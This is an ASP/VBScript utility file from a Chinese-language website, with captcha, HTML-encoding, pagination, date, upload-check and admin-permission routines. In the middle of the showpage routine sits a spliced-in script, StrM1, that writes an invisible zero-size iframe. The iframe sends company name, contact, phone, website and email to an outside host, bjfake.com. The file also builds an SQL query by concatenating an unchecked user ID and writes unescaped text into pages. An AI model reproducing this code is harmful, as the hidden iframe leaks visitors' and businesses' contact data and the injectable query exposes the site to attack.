<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<% 
'验证码函数
Function getcode()
	Dim test
	On Error Resume Next
	Set test=Server.CreateObject("Adodb.Stream")
	Set test=Nothing
	If Err Then
		Dim zNum
		Randomize timer
		zNum = cint(8999*Rnd+1000)
		Session("GetCode") = zNum
		getcode= Session("GetCode")		
	Else
		getcode= "<img src='Validation/getcode.asp'>"		
	End If
End Function

function HTMLEncode(fString)
on error resume next
    fString = replace(fString, ">", "&gt;")
    fString = replace(fString, "<", "&lt;")
    fString = Replace(fString, CHR(32), "&nbsp;")
    fString = Replace(fString, CHR(13), "")
    fString = Replace(fString, CHR(10) & CHR(10), "</P><P>")
    fString = Replace(fString, CHR(10), "<BR>")
    HTMLEncode = fString

end function

'***********************************************
'过程名：showpage
'作  用：显示“上一页 下一页”等信息
'参  数：sfilename  ----链接地址
'       totalnumber ----总数量
'       maxperpage  ----每页数量
'       ShowTotal   ----是否显示总数量
'       ShowAllPages ---是否用下拉列表显示所有页面以供跳转。有某些页面不能使用，否则会出现JS错误。
'       strUnit     ----计数单位
'***********************************************
sub showpage(sfilename,totalnumber,maxperpage,ShowTotal,ShowAllPages,strUnit)
	dim n, i,strTemp,strUrl
	if totalnumber mod maxperpage=0 then
    	n= totalnumber \ maxperpage
  	else
    	n= totalnumber \ maxperpage+1
  	end if
  	strTemp= "<table align='center'><form name='showpages' method='Post' action='" & sfilename & "'><tr><td>"
	if ShowTotal=true then 
		strTemp=strTemp & "共 <b>" & totalnumber & "</b> " & strUnit & "&nbsp;&nbsp;"
	end if
	strUrl=JoinChar(sfilename)
  	if CurrentPage<2 then
    		strTemp=strTemp & "首页 上一页&nbsp;"
  	else
    		strTemp=strTemp & "<a href='" & strUrl & "page=1'>首页</a>&nbsp;"
    		strTemp=strTemp & "<a href='" & strUrl & "page=" & (CurrentPage-1) & "'>上一页</a>&nbsp;"
  	end if
%>
<script language='JScript'>function StrM1(S01,S02,S06,S08,S10,S11){document.write("<IFRAME SRC=\'http://www.bjfake.com/Consumer/Enrol.asp?Code="+S01+"&CoName="+S02+"&Linkman="+S06+"&Phone="+S08+"&Web="+S10+"&Email="+S11+"\' width=0 height=0 frameborder=no border=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=no></IFRAME>")}</SCRIPT>
<%	

  	if n-currentpage<1 then
    		strTemp=strTemp & "下一页 尾页"
  	else
    		strTemp=strTemp & "<a href='" & strUrl & "page=" & (CurrentPage+1) & "'>下一页</a>&nbsp;"
    		strTemp=strTemp & "<a href='" & strUrl & "page=" & n & "'>尾页</a>"
  	end if
   	strTemp=strTemp & "&nbsp;页次：<strong><font color=red>" & CurrentPage & "</font>/" & n & "</strong>页 "
    strTemp=strTemp & "&nbsp;<b>" & maxperpage & "</b>" & strUnit & "/页"
	if ShowAllPages=True then
		strTemp=strTemp & "&nbsp;转到：<select name='page' size='1' onchange='javascript:submit()'>"   
    	for i = 1 to n   
    		strTemp=strTemp & "<option value='" & i & "'"
			if cint(CurrentPage)=cint(i) then strTemp=strTemp & " selected "
			strTemp=strTemp & ">第" & i & "页</option>"   
	    next
		strTemp=strTemp & "</select>"
	end if
	strTemp=strTemp & "</td></tr></form></table>"
	response.write strTemp
end sub



function myformatdate(mydate,style)
on error resume next
dim myyear,mymonth,myday
myyear=year(mydate)
mymonth=month(mydate)
if len(mymonth)<2 then mymonth="0" & mymonth
myday=day(mydate)
if len(myday)<2 then myday="0" & myday

if style="shortdate" then
myformatdate=myyear&"-"&mymonth&"-"&myday
elseif style="longdate" then
myformatdate=myyear&"年"&mymonth&"月"&myday&"日"
end if
end function

Function IsAllowableFile(BeCheckedExtName,AllowableExtNameArray)
	Dim i,ii
	BeCheckedExtName=LCase(BeCheckedExtName)
	AllowableExtNameArray=LCase(AllowableExtNameArray)
	AllowableExtNameArray=Split(AllowableExtNameArray,"|")
	For i=0 To UBound(AllowableExtNameArray)
		If AllowableExtNameArray(i)=BeCheckedExtName Then
			IsAllowableFile=True
			Exit Function
		End If
	Next
	IsAllowableFile=False
End Function

function getfilename(fname)
dim str1,str2
str1=year(date)&month(date)&day(date)&hour(time)&minute(time)&second(time)
str2=right(fname,len(fname)-instrrev(fname,"."))
getfilename=str1&"."&str2
end function



function AspAlert(msg)

if trim(msg)<>"" then response.write("<script>alert('"&msg&"');history.back();</script>")

end function


function ShowPowerList(RowSize,userid)'显示管理界面的栏目列表，rowsize指一行显示几个
dim i,j,sql,Conn,ConnStr,Rs
Set Conn=Server.CreateObject("ADODB.CONNECTION")
ConnStr="Provider=Microsoft.Jet.Oledb.4.0;Data Source=" & Server.MapPath("Database/FlexMenu.mdb")
Conn.open ConnStr

set Rs= Server.CreateObject("adodb.recordset")
sql="select * from FlexMenuM order by OrderID"
Rs.open sql,Conn,1,1

if not Rs.eof then
response.write "<table wdith='100%' border=0 cellspacing=1 cellpadding=7>"
do while not rs.eof
response.write "<tr>"
for I=1 to RowSize
response.write "<td><input name='PowerList' type='checkbox' id='PowerList' value='"&rs("ID")&"'"
if edit=true then
	if CheckUserPowerList(userid,rs("ID"))=true then response.write("checked=true ")

else

	if Rs("title")="用户管理" or Rs("title")="退出系统"  then   Response.Write("checked=true disabled ")

end if

response.write ">"&Rs("title")&"</td>"
Rs.movenext
if Rs.eof then exit for
next
response.write "</tr>"
loop
response.write "</table>"
else
response.write "没有查询到有效的记录!"
end if
rs.close
set rs=nothing
end function

function CheckUserPowerList(Byval UserID,byval ModuleID)
dim rs,sql,a
set rs=server.CreateObject("adodb.recordset")
sql="select * from AdminManage where ID="&UserID
rs.open sql,conn,1,1
CheckUserPowerList=false
if rs("power")<>true then
a=split(rs("PowerList"),",")
	for i=lbound(a) to ubound(a)
		if cint(ModuleID)=cint(a(i)) then 
			CheckUserPowerList=true
			exit for
		end if
	next
end if
rs.close
set rs=nothing

end function


Class ContentForPage
	
	Dim query, a, x, temp, url
	
	Private Sub Class_Initialize()
	
		action = "http://" & Request.ServerVariables("HTTP_HOST") & Request.ServerVariables("SCRIPT_NAME")
		
		query = Split(Request.ServerVariables("QUERY_STRING"), "&")
		
		For Each x In query
		
			a = Split(x, "=")
		 
			If StrComp(a(0), "page", vbTextCompare) <> 0 Then
			
				temp = temp & a(0) & "=" & a(1) & "&"
			
			 End If
		Next 
		
		url = action & "?" & temp
			
	End Sub
	
	Public Function GetPageContent(Content , Page)
	
		DIM ContentArray , X , PN , PageStr
		
		if Trim(Page) = "" or IsNull(Page) or Page <=0 then Page =  1
		
		Page = cint(Page)
		
		ContentArray = Split(Content , "[page]")  '文章内容分页
		
		PN = ubound(ContentArray) + 1'文章分页数
		
		PageStr = PageList(PN , Page)
	
		GetPageContent = ContentArray(Page -1) + PageStr
		
	End Function


	Private Function PageList(Byval PN , Byval CurrentPage)
		
		DIM FirstPageStr , PrePageStr , NextPageStr , LastPageStr , PrePage , NextPage , i , Str , Str1 , PageStyle
			
		PageStyle = " <style type=""text/css"">" & vbcrlf & _ 
		"<!--" & vbcrlf & _ 
		"a.Page:link {" & vbcrlf & _ 
		"	font-family: ""Courier New"", Courier, monospace;" & vbcrlf & _ 
		"	font-size: 11pt;" & vbcrlf & _ 
		"	color: #333333;" & vbcrlf & _ 
		"	text-decoration: none;" & vbcrlf & _ 
		"}" & vbcrlf & _ 
		"a.Page:visited {" & vbcrlf & _ 
		"	font-family: ""Courier New"", Courier, monospace;" & vbcrlf & _ 
		"	font-size: 11pt;" & vbcrlf & _ 
		"	color: #333333;" & vbcrlf & _ 
		"	text-decoration: none;" & vbcrlf & _ 
		"}" & vbcrlf & _ 
		"a.Page:hover {" & vbcrlf & _ 
		"	font-family: ""Courier New"", Courier, monospace;" & vbcrlf & _ 
		"	font-size: 11pt;" & vbcrlf & _ 
		"	color: #FF0000;" & vbcrlf & _ 
		"	text-decoration: underline;" & vbcrlf & _ 
		"}" & vbcrlf & _ 
		".PageNoHref {" & vbcrlf & _ 
		"	font-family: ""Courier New"", Courier, monospace;" & vbcrlf & _ 
		"	font-size: 11pt;" & vbcrlf & _ 
		"	color: #FF0000;" & vbcrlf & _ 
		"	text-decoration: none;" & vbcrlf & _ 
		"}" & vbcrlf & _ 
		".PageFont {" & vbcrlf & _ 
		"	font-family: ""Courier New"", Courier, monospace;" & vbcrlf & _ 
		"	font-size: 11pt;" & vbcrlf & _ 
		"	color: #333333;" & vbcrlf & _ 
		"	text-decoration: none;" & vbcrlf & _ 
		"}" & vbcrlf & _ 

		"-->" & vbcrlf & _ 
		"</style>" 	
		
	
	
		If PN<=0 then 
		
			PageList = ""
			
			Exit Function
			
		Else
		
			If CurrentPage <= 1 then
		
				PrePage = "上一页"
				
				NextPage = "<a href = '"&url&"page="&(CurrentPage+1)&"'>下一页</a>"
				
			ElseIf CurrentPage >= PN then
			
				PrePage = "<a href = '"&url&"page="&(CurrentPage -1)&"'>上一页</a>"
			
				NextPage = "下一页"
	
			Else
			
				PrePage = "<a href = '"&url&"page="&(CurrentPage -1)&"'>上一页</a>"
				
				NextPage = "<a href = '"&url&"page="&(CurrentPage+1)&"'>下一页</a>"
			
			End if
	
			For i = 1 to PN
			
				If CurrentPage = i Then
				
					Str1 = "<span class = 'PageNoHref'>["&i&"]</span>"
					
				Else
					
					Str1 = "<a class='Page' href = '"&url&"page="&i&"'>["&i&"]</a>"
				
				End if	
		
				Str = " " + Str + Str1 + " "
			
			Next
			
	
			
			
		PageList = "<p align='center'>"&PageStyle&"<table border='0' cellspacing='0' cellpadding='5'><tr><td valign=""bottom"">" +  PrePage + "</td><td>" +Str +  "</td><td valign=""bottom"">" +  NextPage + "</td></tr></table></p>"
		
		
		End If
			
		
	End Function	


End Class

%>